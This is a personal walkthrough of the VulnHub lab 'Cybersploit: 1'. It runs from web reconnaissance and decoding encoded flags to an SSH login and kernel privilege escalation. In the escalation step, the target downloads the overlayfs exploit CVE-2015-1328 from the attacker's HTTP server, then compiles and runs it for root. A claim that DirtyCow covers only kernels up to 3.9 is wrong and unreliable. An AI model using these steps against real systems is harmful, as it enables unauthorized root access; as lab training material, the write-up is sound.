# Cybersploit: 1 (VulnHub) — My Walkthrough

**Target:** 10.0.2.16 | **Attacker:** Kali, 10.0.2.6 | **Result:** Root, both flags

This one was a fun change of pace from the DC series — less "one CMS, one CVE" and more "check everywhere, decode everything that looks encoded." Here's how I worked through it.

---

## 1. Finding the box and checking what's running

```bash
sudo nmap -sn 10.0.2.0/24
nmap -sV -p- 10.0.2.16
```

Confirmed it at `.16`. Attack surface was tiny — just SSH (OpenSSH 5.9p1 on an older Debian-based build) and HTTP (Apache 2.2.22 Ubuntu). With only two services and SSH not being exploitable without creds, the web server was obviously where I needed to start.

## 2. Looking past the joke page

```bash
curl -s http://10.0.2.16/ | head -50
```

The actual rendered page was basically a troll — big "LOL! You should try something more!" message. But that line itself felt like a hint, so I didn't just glance at the rendered page, I actually read the raw HTML source. Sitting right at the bottom was an HTML comment:

```html
<!-------------username:itsskv--------------------->
```

A username, deliberately planted where only someone checking the source would find it. That set the tone for the whole box — nothing was going to be handed to me at face value.

## 3. robots.txt wasn't what it claimed to be

```bash
curl -s http://10.0.2.16/robots.txt
```

Instead of a normal robots exclusion file, I got back a base64-looking string. That's a nice bit of misdirection — most scanners and even most people skip robots.txt as boilerplate, so hiding something there is a clever spot.

## 4. Decoding Flag 1

```bash
echo "<the base64 string>" | base64 -d
```

Decoded cleanly into a message containing Flag 1. At this point the pattern was clear: don't trust any file at face value, always try decoding anything that looks off.

## 5. Trying the flag itself as an SSH password

I had a username (`itsskv`) and a flag. On a hunch — since CTF boxes sometimes reuse a discovered artifact as a literal credential — I just tried the flag string directly as the SSH password:

```bash
ssh itsskv@10.0.2.16
```

It worked immediately. Nice payoff for trying the cheap guess before reaching for anything heavier like brute-forcing.

## 6. Finding Flag 2 hiding in plain sight

```bash
ls -la
```

Sitting right there in the home directory listing was Flag 2 — except it was written out in binary (8-bit chunks separated by spaces). Decoded it and got:

> good work! flag2: cybersploit{https:t.me/cybersploit1}

So the encoding kept changing each time — plaintext comment, then base64, then binary. I made a mental note to keep an eye out for the same trick again (hex, ROT13, whatever) since this box clearly liked mixing it up.

## 7. Privesc recon

```bash
sudo -l
cat /etc/os-release
uname -a
```

`sudo -l` asked for a password I didn't have, so that route was closed off for now. But `uname -a` and `/etc/os-release` told me something more useful: Ubuntu 12.04.5 LTS ("Precise Pangolin"), kernel 3.13.0-32-generic. That's old enough that I figured there had to be a known local privesc exploit for this exact combination.

## 8. Finding the right exploit — and almost grabbing the wrong one

```bash
searchsploit ubuntu 3.13.0
```

My first instinct was DirtyCow, since that's the exploit I'd already used successfully on DC-3. But checking the version ranges carefully, DirtyCow (CVE-2016-5195) only covers kernels 2.6.22 through 3.9 — this target's 3.13.0 kernel falls outside that range entirely, so it wouldn't have worked here even if I'd tried it.

Instead, searchsploit turned up an exact match:

```
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
```

That's CVE-2015-1328 — a much better fit for this specific kernel/distro combo. Read through the write-up before touching anything:

```bash
searchsploit -x linux/local/37292.c
```

Good thing I checked — this exploit needed no special compile flags at all, unlike DirtyCow which required `-lutil`. Just a straightforward `gcc` compile and run, per the PoC's own example output.

## 9. Getting the exploit onto the target

On Kali:

```bash
searchsploit -m linux/local/37292.c
python3 -m http.server 8000
```

Copied the exploit source locally, then served it over HTTP so I could pull it onto the target across the NAT Network.

Back on the target (still SSH'd in as itsskv):

```bash
wget http://10.0.2.6:8000/37292.c -O /tmp/ofs.c
```

## 10. Compiling and running it

```bash
cd /tmp
gcc ofs.c -o ofs
./ofs
```

CVE-2015-1328 abuses incorrect permission handling in overlayfs combined with unprivileged user namespace mounts (`FS_USERNS_MOUNT`) — a regular user can mount an overlay filesystem in a way that lets them create files owned by root, and the exploit uses that to write a malicious `/etc/ld.so.preload` that gets loaded with root privileges.

Watching it run matched the PoC exactly: spawning threads, mounting the overlay twice, creating `/etc/ld.so.preload`, building a shared library — and then my prompt just switched to `#`. That's root.

## 11. Confirming root and grabbing the final flag

```bash
id
whoami
```

Confirmed `uid=0(root)`.

```bash
ls -la /root
cat /root/finalflag.txt
```

Quick note here — I tried `cat finalflag.txt` first without the full path and got a "no such file or directory" error, because I wasn't actually sitting in `/root` as my working directory at that point (I'd only run `ls -la /root`, which doesn't change your location). Specifying the full path fixed it immediately, and the final flag read out cleanly. Cybersploit: 1 fully rooted, both flags captured.

---

## Quick Reference

| Step | Command | What it did |
|---|---|---|
| 1 | `nmap -sV -p- <ip>` | Full port/service scan |
| 2 | `curl -s http://<ip>/ \| head -50` | Found the planted username in an HTML comment |
| 3 | `curl -s http://<ip>/robots.txt` | Found base64-encoded content |
| 4 | `echo "<b64>" \| base64 -d` | Decoded Flag 1 |
| 5 | `ssh itsskv@<ip>` | Logged in using Flag 1 as the password |
| 6 | `ls -la` | Found Flag 2, binary-encoded |
| 7 | `sudo -l`, `uname -a`, `/etc/os-release` | Privesc recon, fingerprinted the kernel |
| 8 | `searchsploit ubuntu 3.13.0` | Found the correct exploit (CVE-2015-1328, not DirtyCow) |
| 9 | `searchsploit -m ...` + `python3 -m http.server` | Transferred the exploit to the target |
| 10 | `gcc ofs.c -o ofs` → `./ofs` | Ran the overlayfs exploit, got root |
| 11 | `cat /root/finalflag.txt` | Captured the final flag |
